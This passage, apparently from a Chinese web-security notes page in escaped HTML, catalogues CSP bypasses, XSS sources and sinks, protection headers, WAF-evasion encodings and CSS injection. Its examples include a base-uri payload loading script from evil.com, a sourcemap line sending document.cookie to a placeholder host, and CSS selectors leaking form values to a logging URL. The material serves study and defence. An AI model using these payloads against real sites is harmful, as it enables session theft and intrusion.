punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- chrome --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 预加载某个图片 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;prefetch&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;http://xxxx/x.jpg&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- DNS 预解析 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;dns-prefetch&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://xxxx&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 特定文件类型预加载 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;preload&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;//xxxxx/xx.js&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- chrome --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL 中包含下载资源&lt;/li&gt;
&lt;li&gt;页面中包含音频、视频&lt;/li&gt;
&lt;li&gt;POST、PUT 和 DELET 操作的 ajax 请求&lt;/li&gt;
&lt;li&gt;HTTP 认证&lt;/li&gt;
&lt;li&gt;HTTPS 页面&lt;/li&gt;
&lt;li&gt;含恶意软件的页面&lt;/li&gt;
&lt;li&gt;弹窗页面&lt;/li&gt;
&lt;li&gt;占用资源很多的页面&lt;/li&gt;
&lt;li&gt;打开了 chrome developer tools 开发工具&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mime-sniff&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mime-sniff&#34;&gt;#&lt;/a&gt; MIME Sniff&lt;/h3&gt;
&lt;p&gt;举例来说，csp 禁止跨站读取脚本，但是可以跨站读 img，那么传一个含有脚本的 img，再 &lt;code&gt;&amp;lt;script href=&#39;http://xxx.com/xx.jpg&#39;&amp;gt;&lt;/code&gt; ，这里 csp 认为是一个 img，绕过了检查，如果网站没有回正确的 mime type，浏览器会进行猜测，就可能加载该 img 作为脚本&lt;/p&gt;
&lt;h3 id=&#34;302跳转&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#302跳转&#34;&gt;#&lt;/a&gt; 302 跳转&lt;/h3&gt;
&lt;p&gt;对于 302 跳转绕过 CSP 而言，实际上有以下几点限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跳板必须在允许的域内。&lt;/li&gt;
&lt;li&gt;要加载的文件的 host 部分必须跟允许的域的 host 部分一致&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;iframe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iframe&#34;&gt;#&lt;/a&gt; iframe&lt;/h3&gt;
&lt;p&gt;当可以执行代码时，可以创建一个源为  &lt;code&gt;css&lt;/code&gt;   &lt;code&gt;js&lt;/code&gt;  等静态文件的 frame，在配置不当时，该 frame 并不存在 csp，则在该 frame 下再次创建 frame，达到 bypass 的目的。同理，使用  &lt;code&gt;../../../&lt;/code&gt;   &lt;code&gt;/%2e%2e%2f&lt;/code&gt;  等可能触发服务器报错的链接也可以到达相应的目的。&lt;/p&gt;
&lt;h3 id=&#34;base-uri&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#base-uri&#34;&gt;#&lt;/a&gt; base-uri&lt;/h3&gt;
&lt;p&gt;当 script-src 为 nonce 或无限制，且 base-uri 无限制时，可通过  &lt;code&gt;base&lt;/code&gt;  标签修改根 URL 来 bypass，如下加载了 http://evil.com/main.js&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;base&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://evil.com/&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;nonce&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;correct value&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;/main.js&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token script&#34;&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;location 绕过&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可上传 SVG 时，通过恶意 SVG 绕过同源站点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;存在 CRLF 漏洞且可控点在 CSP 上方时，可以注入 HTTP 响应中影响 CSP 解析&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CND Bypass，如果网站信任了某个 CDN, 那么可利用相应 CDN 的静态资源 bypass&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Angular versions &amp;lt;1.5.9&amp;gt;=1.5.0，存在漏洞 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FuZ3VsYXIvYW5ndWxhci5qcy9wdWxsLzE1MzQ2&#34;&gt;Git Pull Request&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;jQuery sourcemap&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;document.write(`&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//@        sourceMappingURL=http://xxxx/`+document.cookie+`&amp;lt;\/script&gt;`);``&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;a 标签的 ping 属性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For FireFox  &lt;code&gt;&amp;lt;META HTTP-EQUIV=&amp;quot;refresh&amp;quot; CONTENT=&amp;quot;0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;link rel=&amp;quot;import&amp;quot; /&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0; url=http://....&amp;quot; /&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;仅限制  &lt;code&gt;script-src&lt;/code&gt;  时：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;object data=&amp;quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;quot;&amp;gt;&amp;lt;/object&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;xss数据源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss数据源&#34;&gt;#&lt;/a&gt; XSS 数据源&lt;/h1&gt;
&lt;h2 id=&#34;url&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#url&#34;&gt;#&lt;/a&gt; URL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;location&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.href&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.pathname&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.search&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.hash&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.URL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.documentURI&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.baseURI&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;navigation&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#navigation&#34;&gt;#&lt;/a&gt; Navigation&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;window.name&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.referrer&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;communication&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#communication&#34;&gt;#&lt;/a&gt; Communication&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Ajax&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Fetch&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WebSocket&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PostMessage&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;storage&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#storage&#34;&gt;#&lt;/a&gt; Storage&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Cookie&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LocalStorage&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SessionStorage&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sink&#34;&gt;#&lt;/a&gt; Sink&lt;/h1&gt;
&lt;h2 id=&#34;执行javascript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行javascript&#34;&gt;#&lt;/a&gt; 执行 JavaScript&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eval(payload)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setTimeout(payload, 100)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setInterval(payload, 100)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Function(payload)()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;payload&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=x onerror=payload&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;加载url&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加载url&#34;&gt;#&lt;/a&gt; 加载 URL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;location=javascript:alert(/xss/)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.href=javascript:alert(/xss/)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.assign(javascript:alert(/xss/))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.replace(javascript:alert(/xss/))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;执行html&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行html&#34;&gt;#&lt;/a&gt; 执行 HTML&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;xx.innerHTML=payload&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xx.outerHTML=payload&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.write(payload)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.writeln(payload)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;xss保护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss保护&#34;&gt;#&lt;/a&gt; XSS 保护&lt;/h1&gt;
&lt;h2 id=&#34;html过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#html过滤&#34;&gt;#&lt;/a&gt; HTML 过滤&lt;/h2&gt;
&lt;p&gt;使用一些白名单或者黑名单来过滤用户输入的 HTML，以实现过滤的效果。例如 DOMPurify 等工具都是用该方式实现了 XSS 的保护。&lt;/p&gt;
&lt;h2 id=&#34;x-frame&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x-frame&#34;&gt;#&lt;/a&gt; X-Frame&lt;/h2&gt;
&lt;p&gt;X-Frame-Options 响应头有三个可选的值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DENY
&lt;ul&gt;
&lt;li&gt;页面不能被嵌入到任何 iframe 或 frame 中&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SAMEORIGIN
&lt;ul&gt;
&lt;li&gt;页面只能被本站页面嵌入到 iframe 或者 frame 中&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ALLOW-FROM
&lt;ul&gt;
&lt;li&gt;页面允许 frame 或 frame 加载&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;xss保护头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss保护头&#34;&gt;#&lt;/a&gt; XSS 保护头&lt;/h2&gt;
&lt;p&gt;基于 Webkit 内核的浏览器 (比如 Chrome) 在特定版本范围内有一个名为 XSS auditor 的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在 HTML 文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。&lt;/p&gt;
&lt;p&gt;而浏览器是否要拦截这段恶意代码取决于浏览器的 XSS 防护设置。&lt;/p&gt;
&lt;p&gt;要设置浏览器的防护机制，则可使用 X-XSS-Protection 字段 该字段有三个可选的值&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt;  : 表示关闭浏览器的 XSS 防护机制&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt;  : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为 X-XSS-Protection 配置为 1，这是浏览器的默认设置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1; mode=block&lt;/code&gt;  : 如果检测到恶意代码，在不渲染恶意代码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;FireFox 没有相关的保护机制，如果需要保护，可使用 NoScript 等相关插件。&lt;/p&gt;
&lt;h1 id=&#34;waf-bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf-bypass&#34;&gt;#&lt;/a&gt; WAF Bypass&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;利用 &amp;lt;&amp;gt; 标记&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 html 属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;href&lt;/li&gt;
&lt;li&gt;lowsrc&lt;/li&gt;
&lt;li&gt;bgsound&lt;/li&gt;
&lt;li&gt;background&lt;/li&gt;
&lt;li&gt;value&lt;/li&gt;
&lt;li&gt;action&lt;/li&gt;
&lt;li&gt;dynsrc&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关键字&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用回车拆分&lt;/li&gt;
&lt;li&gt;字符串拼接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;window[&amp;quot;al&amp;quot; + &amp;quot;ert&amp;quot;]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用编码绕过&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;base64&lt;/li&gt;
&lt;li&gt;jsfuck&lt;/li&gt;
&lt;li&gt;String.fromCharCode&lt;/li&gt;
&lt;li&gt;HTML&lt;/li&gt;
&lt;li&gt;URL&lt;/li&gt;
&lt;li&gt;hex
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;window[&amp;quot;\x61\x6c\x65\x72\x74&amp;quot;]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;unicode&lt;/li&gt;
&lt;li&gt;utf7
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;+ADw-script+AD4-alert(&#39;XSS&#39;)+ADsAPA-/script+AD4-&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;utf16&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;大小写混淆&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对标签属性值转码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;产生事件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;css 跨站解析&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;长度限制 bypass&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eval(name)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;eval(hash)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;import&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$.getScript&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$.get&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;.&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用  &lt;code&gt;。&lt;/code&gt;  绕过 IP / 域名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document[&#39;cookie&#39;]&lt;/code&gt;  绕过属性取值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;过滤引号用  &lt;code&gt;`&lt;/code&gt;  绕过&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#技巧&#34;&gt;#&lt;/a&gt; 技巧&lt;/h1&gt;
&lt;h2 id=&#34;httponly&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#httponly&#34;&gt;#&lt;/a&gt; httponly&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在 cookie 为 httponly 的情况下，可以通过 xss 直接在源站完成操作，不直接获取 cookie。&lt;/li&gt;
&lt;li&gt;在有登录操作的情况下，部分站点直接发送登录请求可能会带有 cookie&lt;/li&gt;
&lt;li&gt;部分特定版本的浏览器可能会在 httponly 支持 / 处理上存在问题&lt;/li&gt;
&lt;li&gt;低版本浏览器支持 TRACE / TRACK，可获取敏感的 header 字段&lt;/li&gt;
&lt;li&gt;phpinfo 等页面可能会回显信息，这些信息中包含 http 头&lt;/li&gt;
&lt;li&gt;通过 xss 劫持页面钓鱼&lt;/li&gt;
&lt;li&gt;通过 xss 伪造 oauth 等授权请求，远程登录&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;css注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css注入&#34;&gt;#&lt;/a&gt; CSS 注入&lt;/h2&gt;
&lt;h3 id=&#34;基本介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本介绍&#34;&gt;#&lt;/a&gt; 基本介绍&lt;/h3&gt;
&lt;p&gt;CSS 注入最早开始于利用 CSS 中的  &lt;code&gt;expression()&lt;/code&gt;   &lt;code&gt;url()&lt;/code&gt;   &lt;code&gt;regex()&lt;/code&gt;  等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。&lt;/p&gt;
&lt;h3 id=&#34;css-selectors&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css-selectors&#34;&gt;#&lt;/a&gt; CSS selectors&lt;/h3&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token style&#34;&gt;&lt;span class=&#34;token language-css&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token selector&#34;&gt;#form2 input[value^=&#39;a&#39;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token property&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://localhost/log.php/a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token selector&#34;&gt;#form2 input[value^=&#39;b&#39;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token property&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://localhost/log.php/b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token 